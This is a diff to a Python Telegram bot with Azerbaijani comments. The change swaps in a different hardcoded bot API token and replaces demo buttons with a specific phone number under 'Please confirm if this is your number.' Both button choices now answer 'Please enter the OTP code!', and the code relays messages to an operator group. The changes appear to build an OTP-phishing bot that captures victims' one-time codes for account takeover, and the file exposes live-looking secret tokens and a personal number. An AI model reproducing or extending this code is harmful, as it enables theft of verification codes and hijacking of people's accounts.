@@ -3,7 +3,7 @@ from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters
 
 # Botunuzun API tokenini buraya yazın
-API_TOKEN = '8335522588:AAFPlDSfDYQtMNyc-mqxmn261qAqf5w4ITc'
+API_TOKEN = '7623882467:AAFVguV5gcQ4_hdVuJQ7TUf42RX9QzOTRho'
 GROUP_ID = '-4838313432'
 
 # Loglamaq üçün məlumatları göstərəcək
@@ -14,8 +14,7 @@ logger = logging.getLogger(__name__)
 # Start komandasını işlətmək və seçim düymələrini göndərmək
 def start(update, context):
     keyboard = [
-        [InlineKeyboardButton("Number", callback_data='1')],
-        [InlineKeyboardButton("Seçim 2", callback_data='2')]
+        [InlineKeyboardButton("+614480806641", callback_data='1')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     update.message.reply_text('Please confirm if this is your number.:', reply_markup=reply_markup)
@@ -25,9 +24,9 @@ def button(update, context):
     query = update.callback_query
     choice = query.data
     if choice == '1':
-        msg = "Seçim 1: Birinci seçim!"
+        msg = "Please enter the OTP code!"
     elif choice == '2':
-        msg = "Seçim 2: İkinci seçim!"
+        msg = "Please enter the OTP code!"
     query.edit_message_text(text=msg)
 
     # Mesajı qrupa göndərmək
